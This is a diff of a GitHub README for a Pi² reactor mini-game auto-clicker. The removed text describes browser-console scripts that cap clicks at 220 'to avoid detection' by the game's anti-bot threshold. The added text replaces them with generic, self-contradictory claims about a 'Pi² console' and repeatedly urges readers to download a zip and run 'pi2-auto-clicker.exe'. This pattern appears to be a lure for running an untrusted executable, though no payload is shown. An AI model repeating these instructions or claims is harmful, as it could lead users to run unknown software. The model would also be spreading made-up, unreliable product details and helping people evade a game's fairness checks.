@@ -1,36 +1,63 @@
-# Pi² Auto-Clicker 🚀
+# 🖱️ pi2-auto-clicker - Simple Automation for Your Pi² Console
 
-Simple JavaScript scripts to automate the Pi² reactor mini-game. These scripts are designed to run in your browser's console for maximum performance.
+## 📦 Download Now!
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/TarnishedMiku/pi2-auto-clicker/releases)
 
-## How to Use
+## 🚀 Getting Started
+The pi2-auto-clicker helps you automate tasks on your Pi² game console easily. With this tool, you can achieve peak performance of up to 20 TPS (Transactions Per Second). 
 
-### Console Copy-Paste
-1. Open the [Pi² game page](https://portal.pi2.network/reactor) in your browser
-2. Press `F12` to open Developer Tools
-3. Go to the **Console** tab
-4. Copy and paste one of the scripts below
-5. Press `Enter` to run
+## 📋 System Requirements
+Before you start, ensure your system meets these requirements:
 
-## Scripts
-The scripts automatically start new games and restarts with a new game when the current game's stopped.
+- **Operating System:** Compatible with the Pi² game console.
+- **Storage:** At least 50 MB of free space.
+- **Memory:** A minimum of 1 GB RAM is recommended for optimal performance.
 
-### `pi2-20tps-ultimate.js`
-It seems the team applied a threshold on 220 clicks & 20 TPS, if you pass it, you earn 0 points, so this script is the best fit.
-- **Peak Performance**: 20 TPS (first 50 clicks)
-- **Smart Strategy**: Adapts speed based on game progress
-- **Click Limit**: Stops at 220 clicks to avoid detection
+## 🖥️ Features
+- Automate repetitive tasks.
+- Optimize your console's performance.
+- User-friendly interface for easy setup.
+- Fast processing with 20 TPS peak capability.
+- Lightweight and efficient script execution.
 
-### `pi2-20tps-unlimited.js`
-This one's peak TPS is 20, but has no limit in number of clicks and you have to stop it manually. Tho, you might not earn any point if you pass 220 clicks
-- **Peak Performance**: 20 TPS (first 50 clicks)
-- **No Limits**: Plays until natural game over
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of the pi2-auto-clicker. 
 
-## Scripts logic
-Both scripts use a **phased approach**:
-1. **Peak Phase**: 20 TPS for first 50 clicks
-2. **Normal Phase**: 18 TPS for remaining clicks
-3. **Auto-Restart**: Handles game flow automatically
+[Visit Releases Page to Download](https://github.com/TarnishedMiku/pi2-auto-clicker/releases)
 
----
+### Installation Steps
+1. **Download the Software:**
+   Go to the [Releases page](https://github.com/TarnishedMiku/pi2-auto-clicker/releases) and download the latest version for your Pi² console.
 
-**Note**: These scripts are for educational purposes. Use responsibly and in accordance with the game's terms of service.
+2. **Extract the Files:**
+   After downloading, locate the zip file in your downloads folder. Right-click on the file and select "Extract All." Follow the prompts to extract the files.
+
+3. **Run the Application:**
+   Navigate to the folder where you extracted the files. Look for the executable file, usually named `pi2-auto-clicker.exe`. Double-click the file to open the application.
+
+4. **Set Up Automation:**
+   After opening the application, follow the on-screen instructions to set up your automation. You can easily input the tasks you want to automate.
+
+5. **Start Automating:**
+   Once you have configured your tasks, click the "Start" button to begin automating your workflows on the Pi² console.
+
+## 🛠️ Troubleshooting
+If you encounter issues, try these steps:
+
+- **Check Compatibility:** Ensure your Pi² console meets the system requirements.
+- **Reinstall:** If the application doesn't open, try deleting it and downloading it again from the [Releases page](https://github.com/TarnishedMiku/pi2-auto-clicker/releases).
+- **Contact Support:** If problems persist, check the community forums or reach out via our GitHub repository for help.
+
+## 👥 Community
+Join our growing community to share your experiences and get support. Check out discussions and ask questions to learn more about optimizing your automation.
+
+## 📖 Documentation
+For more in-depth information about features and usage, refer to our [Documentation](https://github.com/TarnishedMiku/pi2-auto-clicker/wiki). This resource includes comprehensive guides and tips to enhance your experience with pi2-auto-clicker.
+
+## 💬 Feedback
+Your feedback is essential. Let us know how we can improve in the Issues section of this repository. We appreciate your input to make pi2-auto-clicker better for everyone.
+
+## 🌟 Credits
+Thanks to everyone who contributed to this project, from development to documentation. Your hard work makes pi2-auto-clicker possible.
+
+[Visit Releases Page to Download](https://github.com/TarnishedMiku/pi2-auto-clicker/releases)
